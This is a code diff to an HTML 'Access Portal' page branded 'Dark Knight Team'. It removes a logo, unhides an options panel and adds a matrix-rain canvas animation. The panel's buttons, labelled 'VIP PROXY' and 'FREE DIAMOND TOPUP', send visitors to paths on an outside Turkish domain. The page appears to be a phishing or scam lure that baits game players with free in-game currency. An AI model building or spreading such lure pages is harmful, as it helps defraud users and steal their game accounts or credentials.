@@ -78,6 +78,12 @@
             margin-top: 10px;
             display: none;
         }
+
+        /* Hidden Options */
+        .options {
+            display: none;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -85,7 +91,6 @@
     
     <div class="container" id="loginContainer">
         <h2>🔒 Access Portal</h2>
-        <img src="IMG_6328.jpeg" alt="VIP Logo" width="150" height="150">
         <form id="accessForm">
             <input type="text" id="username" placeholder="Enter Username" required>
             <input type="password" id="key" placeholder="Enter Key" required>
@@ -95,7 +100,7 @@
     </div>
 
     <!-- Options after successful login -->
-    <div class="container options" id="optionsContainer" style="display: none;">
+    <div class="container options" id="optionsContainer">
         <h2>Select an Option</h2>
         <button class="button" onclick="window.location.href='http://season-event.com.tr/^*Z/FF1/?id=6800292901'">VIP PROXY</button>
         <button class="button" onclick="window.location.href='http://season-event.com.tr/^*Z/CODA/?id=6800292901'">FREE DIAMOND TOPUP</button>
@@ -114,6 +119,39 @@
                 document.getElementById("errorMsg").style.display = "block";
             }
         });
+
+        // Matrix Effect
+        var canvas = document.getElementById("matrix");
+        var ctx = canvas.getContext("2d");
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener("resize", resizeCanvas);
+
+        var text = "Dark Knight Team ";
+        var columns = Math.floor(canvas.width / 20);
+        var drops = new Array(columns).fill(1);
+
+        function draw() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.15)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#00ff00";
+            ctx.font = "16px Courier New";
+
+            for (var i = 0; i < drops.length; i++) {
+                var char = text[Math.floor(Math.random() * text.length)];
+                ctx.fillText(char, i * 20, drops[i] * 20);
+                
+                if (drops[i] * 20 > canvas.height && Math.random() > 0.98) 
+                    drops[i] = 0;
+                drops[i]++;
+            }
+        }
+
+        setInterval(draw, 35);
     </script>
 </body>
 </html>
